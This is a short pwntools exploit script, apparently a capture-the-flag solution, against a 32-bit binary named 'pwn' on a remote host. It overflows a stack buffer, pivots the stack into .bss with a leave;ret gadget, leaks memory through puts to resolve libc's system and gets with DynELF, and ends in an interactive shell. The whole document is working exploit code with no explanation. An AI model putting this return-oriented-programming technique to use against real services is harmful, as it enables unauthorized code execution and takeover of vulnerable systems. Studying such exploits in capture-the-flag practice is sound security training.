from pwn import *
offset=44
leave_ret=0x08048503
pop_ebx_ret=0x0804836d
read_plt=0x8048380
puts_plt=0x8048390
debug=0xf7ebc6c0




elf=ELF('./pwn')
main=elf.symbols['main']
bss=elf.bss()

buf1=bss+0xa00
buf2=bss+0xc00
p=process('./pwn')
p=remote("121.42.189.18",10006)
p.recvline();
payload='Y'*40+p32(buf1)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf1)+p32(200)
p.send(payload)

def leak(addr):
	global buf1,buf2,delay
	buf1,buf2 =buf2,buf1
	payload=p32(buf1)+p32(puts_plt)+p32(pop_ebx_ret)+p32(addr)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf1)+p32(200)
	p.sendline(payload)
	data=p.recvrepeat(0.1)[:-1]+"\x00"
	return data
#print hex(u32(leak(puts_plt)))
ptr_libc=leak(0x8049ff0)[:4]
d=DynELF(leak,main,elf=elf)
system=d.lookup('system','libc')
gets=d.lookup('gets','libc')
p.sendline(p32(0xdeadbeef)+p32(gets)+p32(system)+p32(buf1)+p32(buf1+4))
p.interactive();

